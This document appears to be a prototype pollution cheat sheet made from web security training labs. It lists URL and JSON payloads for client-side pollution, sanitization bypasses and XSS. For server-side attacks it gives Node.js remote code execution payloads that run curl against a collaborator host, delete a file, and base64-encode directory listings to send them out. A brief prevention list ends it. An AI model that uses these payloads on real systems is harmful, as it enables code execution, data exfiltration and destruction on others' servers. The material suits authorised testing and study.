# Check The payloads on URL
      * /?__proto__[foo]=bar
      * /?__proto__.foo=bar
      * /?constructor.prototype.foo=bar

# Bypass Sanitization

      * /?__pro__proto__to__[foo]=bar
      * /?__pro__proto__to__.foo=bar
      * /?constconstructorructor[protoprototypetype][foo]=bar
      * /?constconstructorructor.protoprototypetype.foo=bar
      
# Use DOM Invader

# Observe the value in Elements Tab

     * /?__proto__[value]=foo
     * /?__proto__[value]=data:,alert(1);

# Test The Json Data with Response

     * "__proto__" : { "foo":"bar" }

# Test the Json Data without Response

     Request 1
     * "role":"+AGYAbwBv-"

     Request 2
     * "__proto__":{ "content-type": "application/json; charset=utf-7"}

     Response
     * "role":"foo"

# XSS Exploit

      *  /?__proto__.XXXXXX=alert(1)
      * /?__pro__proto__to__[XXXXXXX]=data:,alert(1);

# Server-Side Prototype Pollution Scanner Burp Extension

# Test With json spaces

     * "__proto__": {
    "json spaces":10
}
     * "constructor": {
    "prototype": {
        "json spaces":10
    }
}

# Test for RCE Execution

     * "__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}

     * "__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}


     * "__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}

     * "__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}

               * "input":":! ls /home/carlos | base64 | curl -c https://YOUR-COLLABORATOR-ID.oastify.com\n"
               * "input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"

               







$ Prevention


# Sanitize __proto__
# Robust Way Object.freeze(Object.prototype); (freeze or seal)
# Preventing an object from inheriting properties
# Using Safer alternatives (get())
